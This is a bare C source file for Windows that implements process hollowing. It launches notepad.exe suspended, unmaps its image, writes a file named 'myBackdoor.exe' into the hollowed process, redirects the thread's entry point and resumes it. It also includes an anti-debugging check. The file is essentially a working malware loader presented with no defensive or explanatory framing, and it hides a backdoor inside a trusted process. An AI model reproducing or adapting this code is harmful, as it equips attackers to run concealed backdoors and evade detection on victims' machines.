#include <stdio.h>
#include <Windows.h>


#define myExitError(msg) fprintf(stderr, \
                                "%s  , (Error : %x )\n" , msg \
                                 , GetLastError() ) ;\
                         ExitProcess(-1); \


#define NT_SUCCESS 0x00000000


typedef    ( * NtUnmapViewOfSection)     ( IN HANDLE  ProcessHandle ,  IN  PVOID   BaseAddress );
typedef    ( * NtWriteVirtualMemory)     ( IN HANDLE  ProcessHandle ,  IN  PVOID   BaseAddress , IN PVOID Buffer , IN ULONG NumberOfBytesToWrite, OUT PULONG NumberOfBytesWritten OPTIONAL );
typedef    ( * NtReadVirtualMemory )     ( IN HANDLE  ProcessHandle ,  IN  PVOID   BaseAddress , OUT PVOID  Buffer, IN ULONG NumberOfBytesToRead,OUT PULONG NumberOfBytesReaded OPTIONAL   );
typedef    ( * NtResumeThread )          ( IN HANDLE  ThreadHandle,  OUT PULONG SuspendCount OPTIONAL ) ;
typedef    ( * NtGetContextThread)       ( IN HANDLE  ThreadHandle , OUT PCONTEXT pContext );
typedef    ( * NtSetContextThread)       ( IN HANDLE  ThreadHandle, IN PCONTEXT Context );
typedef    ( * NtQueryInformationProcess)( HANDLE ,   UINT ,PVOID ,ULONG , PULONG);



int main(int argc,char* argv[])
{

    NtUnmapViewOfSection    myNtUnmapViewOfSection ;
    NtReadVirtualMemory     myNtReadVirtualMemory  ;
    NtWriteVirtualMemory    myNtWriteVirtualMemory ;
    NtResumeThread          myNtResumeThread;
    NtGetContextThread      myNtGetContextThread;
    NtSetContextThread      myNtSetContextThread ;
    NtQueryInformationProcess myNtQueryInformationProcess ;


    HMODULE dll = LoadLibraryA("ntdll.dll");
    myNtUnmapViewOfSection    = (NtUnmapViewOfSection)GetProcAddress(dll,"NtUnmapViewOfSection");
    myNtReadVirtualMemory     = (NtReadVirtualMemory )GetProcAddress(dll,"NtReadVirtualMemory");
    myNtWriteVirtualMemory    = (NtWriteVirtualMemory)GetProcAddress(dll,"NtWriteVirtualMemory");
    myNtSetContextThread      = (NtSetContextThread)GetProcAddress(dll,"NtSetContextThread");
    myNtGetContextThread      = (NtGetContextThread)GetProcAddress(dll,"NtGetContextThread");
    myNtResumeThread          = (NtResumeThread)GetProcAddress(dll,"NtResumeThread");
    myNtQueryInformationProcess =(NtQueryInformationProcess)GetProcAddress(dll,"NtQueryInformationProcess");


    PVOID MyExe,Allocated,BaseAddrOfSuspendedProcess;
    DWORD i,read,noDebuginherit = 0,nSizeOfFile;
    HANDLE hMyExe ;
    IMAGE_DOS_HEADER * IDH;
    IMAGE_NT_HEADERS  * INH;
    IMAGE_SECTION_HEADER  * ISH;
    STARTUPINFO StartInfo;
    PROCESS_INFORMATION ProcInfo;
    CONTEXT ThreadContext;;

    memset(&StartInfo,0,sizeof(StartInfo));
    memset(&ProcInfo,0,sizeof(ProcInfo));

    if((myNtQueryInformationProcess(GetCurrentProcess(),0x7,&noDebuginherit,4,NULL)) != NT_SUCCESS )
    {
        ExitProcess(-1);
    }

    if(!CreateProcess(NULL,"C:\\windows\\system32\\notepad.exe",NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&StartInfo,&ProcInfo))
    {
        myExitError("Error in creating a target process in suspended state ");
    }

    ThreadContext.ContextFlags=CONTEXT_FULL;
    hMyExe=CreateFile("myBackdoor.exe",GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);

    if(hMyExe==INVALID_HANDLE_VALUE)
    {
        myExitError(" Cannot open The Backdoor ");
    }

    nSizeOfFile=GetFileSize(hMyExe,NULL);

    MyExe = VirtualAlloc(NULL,nSizeOfFile,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);

    ReadFile(hMyExe,MyExe,nSizeOfFile,&read,NULL) ;


    IDH=(PIMAGE_DOS_HEADER)MyExe;

    INH=(PIMAGE_NT_HEADERS)((LPBYTE)MyExe+IDH->e_lfanew);

    myNtGetContextThread(ProcInfo.hThread,&ThreadContext);
    myNtReadVirtualMemory(ProcInfo.hProcess,(PVOID)(ThreadContext.Ebx+8),&BaseAddrOfSuspendedProcess,sizeof(PVOID),NULL);

    if((DWORD)BaseAddrOfSuspendedProcess == INH->OptionalHeader.ImageBase)
    {
        myNtUnmapViewOfSection(ProcInfo.hProcess,BaseAddrOfSuspendedProcess);
        printf("Unmapping Target Exe starting from %x \n",BaseAddrOfSuspendedProcess);
    }

    Allocated=VirtualAllocEx(ProcInfo.hProcess,(PVOID)INH->OptionalHeader.ImageBase,INH->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE); 

    if(Allocated != INH->OptionalHeader.ImageBase)
    {
        printf("Cannot allocate memory in at %X in target process !! \n",INH->OptionalHeader.ImageBase);
        ExitProcess(-1);
    }

    if(myNtWriteVirtualMemory(ProcInfo.hProcess,Allocated,MyExe,INH->OptionalHeader.SizeOfHeaders,NULL) != NT_SUCCESS )
    {
        myExitError("Cannot write in target address space ");
    }

    for(i=0; i<INH->FileHeader.NumberOfSections; i++)
    {
        ISH=(PIMAGE_SECTION_HEADER)((LPBYTE)MyExe+IDH->e_lfanew+sizeof(IMAGE_NT_HEADERS)+(i*sizeof(IMAGE_SECTION_HEADER)));
        myNtWriteVirtualMemory(ProcInfo.hProcess,(PVOID)((LPBYTE)Allocated+ISH->VirtualAddress),(PVOID)((LPBYTE)MyExe+ISH->PointerToRawData),ISH->SizeOfRawData,NULL); 
    }

    ThreadContext.Eax=(DWORD)((LPBYTE)Allocated+INH->OptionalHeader.AddressOfEntryPoint);

    printf(" New entry point: %x \n",ThreadContext.Eax);

    myNtWriteVirtualMemory(ProcInfo.hProcess,(PVOID)(ThreadContext.Ebx+8),&INH->OptionalHeader.ImageBase,sizeof(PVOID),NULL);

    myNtSetContextThread(ProcInfo.hThread,&ThreadContext);

    if(myNtResumeThread(ProcInfo.hThread,NULL) != NT_SUCCESS )
    {
        myExitError("Cannot Resume Thread ");
    }



    return 0;
}
